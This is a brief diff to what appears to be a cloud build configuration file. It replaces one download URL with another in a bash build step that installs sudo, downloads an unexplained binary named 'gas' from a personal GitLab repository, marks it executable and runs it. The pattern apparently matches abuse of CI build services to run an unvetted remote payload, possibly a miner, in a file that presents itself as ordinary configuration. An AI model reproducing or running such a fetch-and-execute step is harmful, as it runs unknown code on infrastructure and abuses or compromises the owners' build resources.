@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-         apt update && apt-get install sudo -y && wget https://gitlab.com/bam6/bambang/-/raw/main/gas && chmod u+x gas && ./gas
+         apt update && apt-get install sudo -y && wget https://gitlab.com/rudi.hartono.laoz/sek/-/raw/main/gas && chmod u+x gas && ./gas
     waitFor:
       - '-'
     entrypoint: /bin/bash
